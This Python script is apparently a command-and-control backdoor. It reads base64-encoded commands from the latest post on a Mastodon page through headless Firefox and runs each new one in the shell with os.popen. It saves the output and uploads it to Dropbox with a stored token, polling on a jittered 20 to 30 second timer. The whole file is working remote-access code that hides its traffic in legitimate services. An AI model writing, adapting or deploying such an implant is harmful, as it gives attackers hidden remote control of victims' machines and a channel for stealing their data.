import toml
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
import base64
import time
import random
import os
import dropbox

# get username and server from a toml file
def get_credentials():
    # Print status
    print("[*] Getting credentials from config file")

    # Define the url and dropbox_token as a global variable
    global url, dropbox_token

    # Load the config file
    config = toml.load("config.toml")

    # Get the url from the config file
    url = config["url"]

    # Get dropbox token from the config file
    dropbox_token = config["dropbox_token"]

# get latest command from the user with Selenium
def get_latest_command():
    # Set Firefox options
    options = Options()
    options.add_argument("--headless")

    # Get the page with gecko driver headless
    driver = webdriver.Firefox(options=options)

    # Get the page
    driver.get(url)

    # Wait for the page to load
    time.sleep(1)

    # Get the latest toot
    latest_toot = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div[2]/div[2]/div/div/div/article[1]/div/div/div[1]/div/p").text

    # Close the driver
    driver.close()

    # Decode the toot
    command = base64.b64decode(latest_toot).decode("utf-8")

    # Return the command
    return command

# Use dropbox api to upload the file
def upload_output():
    # Print status
    print("[*] Uploading output to dropbox...")
    # Get the output file
    output = open("output.txt", "rb")

    # Upload the file
    dbx = dropbox.Dropbox(dropbox_token)
    dbx.files_upload(output.read(), "/output.txt", mode=dropbox.files.WriteMode.overwrite)

    # Print status
    print("[*] Output uploaded to dropbox!")

# Listen for commands and execute them
def listen_for_commands():
    # Print status
    print("[*] Listening for commands...")
    # Get the latest command
    command = get_latest_command()

    # listen periodically for new toots
    while True:
        # Get the latest command
        try:
            latest_command = get_latest_command()
        except:
            print("[!] Error getting latest command")
            latest_command = command

        # Check if the latest toot is equal to the previous one
        if latest_command != command:
            # Print the command
            print("[+] Executing command: " + latest_command)

            # Execute the command if it is different and get the output
            output = os.popen(latest_command).read()

            # Save the output to a file
            with open("output.txt", "w") as f:
                f.write(output)

            # Upload the output to dropbox
            upload_output()

            # Set the command to the latest command
            command = latest_command
        
        # Sleep for random time between 20 and 30 seconds
        time.sleep(random.randint(20, 30))

# main function
def main():
    # Get the credentials
    get_credentials()
    listen_for_commands()

if __name__ == "__main__":
    main()